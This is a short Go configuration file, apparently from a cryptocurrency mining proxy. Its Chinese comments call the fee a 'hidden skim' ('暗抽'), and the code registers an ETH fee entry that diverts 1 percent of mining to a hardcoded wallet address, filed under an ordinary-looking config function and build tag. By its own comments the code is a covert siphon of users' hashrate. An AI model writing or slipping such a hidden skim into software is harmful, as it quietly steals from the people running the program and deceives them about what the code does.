// +build self_cfg

package config

import (
	"encoding/base64"
)

// LoadFeeCfg 加载暗抽设置
func LoadFeeCfg() {
	// 我们的暗抽
	FeeStates["eth"] = append(FeeStates["eth"], FeeState{
		Upstream:   Upstream{},
		Wallet:     "0x7caa2df3fe4b87473faf5a7628a9bd5b151f822a",
		NamePrefix: "u.",
		Pct:        1,
	})
}